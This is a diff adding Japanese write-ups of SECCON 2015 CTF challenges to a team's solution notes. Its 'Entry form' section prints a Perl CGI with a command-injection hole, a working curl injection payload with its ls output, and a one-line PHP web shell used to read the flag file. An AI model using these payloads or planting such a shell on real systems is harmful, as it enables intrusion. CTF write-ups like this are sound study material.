@@ -21,9 +21,9 @@ ping
 |★|Reverse-Engineering Android APK 1|Binary|100|287||
 |★|Fragment2|Web/Network|200|60|xmisao|
 ||Reverse-Engineering Hardware 1|Binary|400|20||
-|★|Connect the server|Web/Network|100|587||
+|★|Connect the server|Web/Network|100|587|oppai|
 |★|Command-Line Quiz|Unknown|100|396|tsb|
-|★|Entry form|Web/Network|100|189||
+|★|Entry form|Web/Network|100|189|oppai|
 ||Bonsai XSS Revolutions|Web/Network|200|49||
 |★|Exec dmesg|Binary|300|175|kubo39|
 |★|Decrypt it|Crypto|300|199|tsb|
@@ -35,7 +35,7 @@ ping
 ||Micro computer exploit code challenge|Exploit|300|15||
 ||GDB Remote Debugging|Binary|200|60||
 ||FSB: TreeWalker|Exploit|200|51||
-|★|Steganography 1|Stegano|100|304||
+|★|Steganography 1|Stegano|100|304|oppai|
 ||Steganography 2|Stegano|100|18||
 |★|Steganography 3|Stegano|100|172|xmisao|
 |★|4042|Unknown|100|63|xmisao|
@@ -132,9 +132,124 @@ ruby hex2bin.rb haffman.txt
 
 ## Connect the server
 
+### 問題
+
+```
+login.pwn.seccon.jp:10000
+```
+
+### 概要
+
+とりあえずncで接続してみると、コンソールが表示されて `login:` というのが出てきた。
+何度か適当に入力を試してると `HINT: It is already in your hands.` という文字列が出てきた。
+
+試しにGoogleChromeでアクセスするとファイルがダウンロード出来て、`SECCON{Sometimes_what_you_see_is_NOT_what_you_get}` が手に入った。
+
+### 使用ツール
+- GoogleChrome
+- vim
+
 ## Command-Line Quiz
 
 ## Entry form
+
+### 問題
+
+```
+http://entryform.pwn.seccon.jp/register.cgi
+
+( Do not use your real mail address.)
+(登録情報に他人に知られたくないメールアドレスは使用しないでください)
+```
+
+### 概要
+
+まず、http://entryform.pwn.seccon.jp/にアクセスするとファイル一覧が有効になっていた。
+
+http://entryform.pwn.seccon.jp/register.cgi_bakというファイルがあるのでアクセスすると
+register.cgiの中身っぽい。
+
+```perl
+#!/usr/bin/perl
+# by KeigoYAMAZAKI, 2015.11.02-
+
+use CGI;
+my $q = new CGI;
+
+print<<'EOM';
+Content-Type: text/html; charset=utf-8
+
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SECCON 2015</title>
+</head>
+<body style='background:#000;color:#52d6eb;font-family:"ヒラギノ明朝 ProN W6", "HiraMinProN-W6", "HG明朝E", "ＭＳ Ｐ明朝", "MS PMincho", "MS 明朝", serif'>
+<img src="logo.png">
+<h2 style="text-align:center">SECURITY CONTEST 2015</h2>
+<h1 style="font-size:28px;border-top:1px solid #28363D;border-bottom:1px solid #28363D;padding:15px">Entry Form</h1>
+<form action="?" method="get"><pre>
+EOM
+
+if($q->param("mail") ne '' && $q->param("name") ne '') {
+  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
+  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
+  close(SH);
+
+  open(LOG, ">>log"); ### <-- FLAG HERE ###
+  flock(LOG, 2);
+  seek(LOG, 0, 2);
+  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
+  close(LOG);
+
+  print "<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>";
+  exit;
+}
+
+print <<'EOM';
+</pre><table border="0" style="margin:30px">
+<tr><td>Your E-Mail address:</td><td><input type="email" name="mail" size="30" required></td></tr>
+<tr><td>Your Name:</td><td><input type="text" name="name" size="30" required></td></tr>
+<tr><td colspan="2"><input type="submit" name="action" value="Send" style="background-color:#52d6eb;border-style:none;padding:5px;margin:10px"></td></tr>
+</table>
+</form>
+</body>
+</html>
+EOM
+
+1;
+```
+
+`http://host/log` というログが書かれているファイルをどうにか読めば良さそう。
+初めはmailsendを使ってるので、メールヘッダインジェクションかなって思ったけど、普通にopenコマンドの所にOSコマンドインジェクションがある。
+
+`curl -i -X GET "http://entryform.pwn.seccon.jp/register.cgi?mail='%20|ls%20-l'&name=hoge&action=Send"` こんな感じで叩いてやると、HTMLの中にls結果が紛れてくる。
+
+```
+<form action="?" method="get"><pre>
+total 772
+dr-xr-xr-x 2 root   root   4096 Dec  1 21:52 SECRETS
+-r---w---- 1 apache cgi  769650 Dec  5 18:16 log
+-r--r--r-- 1 root   root   1132 May 15  2015 logo.png
+-r-xr-xr-x 1 cgi    cgi    1583 Dec  1 22:02 register.cgi
+-r--r--r-- 1 root   root   1583 Dec  1 22:25 register.cgi_bak
+<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>%
+```
+
+`SECRET` ディレクトリの中に`backdoor123.php`というのがあって、catで表示させてみると。
+
+```
+<pre><?php system($_GET['cmd']); ?></pre>
+```
+
+`backdoor123.php` はrootで実行されてるため、logの中身を見れるよう。(いたずらも出来そう)
+
+`curl -i -X GET "http://entryform.pwn.seccon.jp/SECRET/backdoor123.php?cmd=head%20../log"`
+
+`SECCON{Glory_will_shine_on_you.}`
+
+### 使ったツール
+- curl
 
 ## Bonsai XSS Revolutions
 
@@ -211,6 +326,23 @@ $ls -ll /bin/dmesg
 ## FSB: TreeWalker
 
 ## Steganography 1
+
+```
+Find image files in the file
+MrFusion.gpjb
+Please input flag like this format-->SECCON{*** ** **** ****}
+```
+
+### 概要
+
+1枚の[画像](https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Stegano/100_Steganography%201/MrFusion.gpjb?raw=true)の中に複数の画像形式が含まれている奴です 分解するとバックトゥーザフューチャーのあれだった。分解方法としてはバイナリエディタ(vim)で目grepでした。
+`OCT 21 2015 07 28`と言うのはわかったけど、それを`{}`で囲っても駄目だった。
+ヒントが出てから, `SECCON{*** ** **** ****}` と知る。
+
+`SECCON{OCT 21 2015 0728}`
+
+### 使ったツール
+- vim
 
 ## Steganography 2
 
